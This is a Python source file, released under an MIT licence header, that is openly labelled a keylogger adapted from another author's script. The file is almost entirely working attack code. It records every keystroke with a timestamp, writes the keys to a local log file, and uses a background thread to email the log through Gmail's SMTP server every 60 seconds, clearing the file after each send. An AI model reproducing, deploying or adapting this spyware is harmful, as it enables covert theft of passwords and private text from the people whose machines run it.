"""
Keylogger script adapted and modified from Satyam Pathania's work.

MIT License

Copyright (c) 2024 Satyam Pathania
Modifications (c) 2025 by ChaseJace

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from pynput.keyboard import Listener
import datetime
import pyperclip
import os
import smtplib
import time
import threading

log_file = "keylog.txt"

EMAIL = "username"  # Replace with your email
PASSWORD = "password"  # Use an App Password, not your regular password

key_logs = []  # Store keystrokes before writing to file
email_interval = 60  # Send logs every 60 seconds


def write_log():
    """Write logs to file."""
    with open(log_file, "a") as f:
        f.writelines(key_logs)


def on_press(key):
    """Capture keypresses and save to log."""
    global key_logs
    try:
        key_logs.append(f"{key.char}")  # Regular keys
    except AttributeError:
        key_logs.append(f"[{key}]")  # Special keys

    key_logs.append(f" {datetime.datetime.now()} \n")  # Timestamp

    if len(key_logs) >= 50:  # Write to file every 50 keystrokes
        write_log()
        key_logs = []


def send_email():
    """Periodically send logs via email."""
    while True:
        time.sleep(email_interval)
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                logs = f.read()

            if logs.strip():  # Only send if there are new logs
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(EMAIL, PASSWORD)
                    server.sendmail(EMAIL, EMAIL, logs)
                    server.quit()

                    # Clear log file after sending
                    open(log_file, "w").close()
                except Exception as e:
                    print(f"Error sending email: {e}")

# Start email sender in a background thread
threading.Thread(target=send_email, daemon=True).start()

# Start keylogger
with Listener(on_press=on_press) as listener:
    listener.join()

